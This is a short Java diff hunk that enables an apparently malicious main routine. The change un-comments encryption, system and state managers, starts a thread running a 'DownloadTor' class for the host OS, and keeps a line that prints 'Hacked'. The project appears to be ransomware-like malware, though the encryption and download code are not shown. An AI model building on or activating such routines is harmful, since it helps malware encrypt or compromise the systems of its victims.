@@ -21,15 +21,14 @@ public static final String MODE = "POWERED";
 	
 	public static void main(String[] args) {
 		
-		if(MODE.equals("POWERED")) {
-			Thread thread = new Thread(new DownloadTor("windows"));
-			thread.start();
-		}
-		
-		
-		/*EncryptionManager encryption = new EncryptionManager();
+		EncryptionManager encryption = new EncryptionManager();
 		SystemManager system = new SystemManager();
 		StateManager stateManager = new StateManager(system.getConfigPath());
+		
+		if(MODE.equals("POWERED")) {
+			Thread thread = new Thread(new DownloadTor(system.getOsType()));
+			thread.start();
+		}
 
 		HashMap<String, Integer> params = new HashMap<String, Integer>();
 	
@@ -71,6 +70,6 @@ public static final String MODE = "POWERED";
 				System.out.println("Hacked");
 			}
 		}
-	*/
+	
 	}
 }
